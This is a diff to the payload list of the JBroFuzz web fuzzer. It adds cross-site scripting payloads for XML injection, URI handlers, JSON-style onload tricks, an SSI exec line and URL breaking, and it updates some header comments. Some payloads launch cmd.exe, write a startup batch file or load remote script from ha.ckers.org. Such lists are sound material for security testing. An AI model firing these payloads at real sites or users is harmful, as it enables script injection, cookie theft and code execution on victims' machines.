@@ -5,7 +5,7 @@
 # -----------------------------------------------------------------------------
 #
 # Maximum number of lines		1024
-# Maximum line length			256
+# Maximum line length			512
 #
 # -----------------------------------------------------------------------------
 # A bit of (fuzzing) theory 
@@ -29,7 +29,7 @@
 # particular part of the request against the given value list. 
 #
 # -----------------------------------------------------------------------------
-# What JBroFuzz-0.5 supports (what you change in this file and will work)
+# What JBroFuzz supports (what you change in this file and will work)
 # -----------------------------------------------------------------------------
 #
 # This version supports the alteration/addition of generators as seen below.
@@ -139,6 +139,40 @@ perl -e 'print "<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
 <BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>
 <<SCRIPT>alert("XSS");//<</SCRIPT>
 <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+
+P:XSS-XML:XSS XML Injection:6
+> Cross Site Scripting | XML Injection
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>
+
+P:XSS-URI:URI Cross Site Scripting:4
+> Cross Site Scripting | URI Exploits
+aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"
+firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
+navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
+res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
+
+P:XSS-JSN:JSON:5
+> Cross Site Scripting | JSON
+<body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;
+<body onload=a1={x:this.parent.document};a1.x.writeln(1);>
+<body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
+<body/s/onload=x={doc:parent.document};x.doc.writeln(1)
+<body/â€?â€?$/onload=x={doc:parent[â€™documentâ€™]};x.doc.writeln(1)
+
+P:XSS-SSI:Server Side Includes:1
+> Cross Site Scripting | SSI
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+
+P:XSS-URL-BRK:URL Breaking:3
+> Cross Site Scripting | URL Break
+http://aa"><script>alert(123)</script>
+http://aa'><script>alert(123)</script>
+http://aa<script>alert(123)</script>
 
 R:NUM-HEX-LOW:Hexadecimal Fuzz Type:16
 > Category String | Characters | Hex
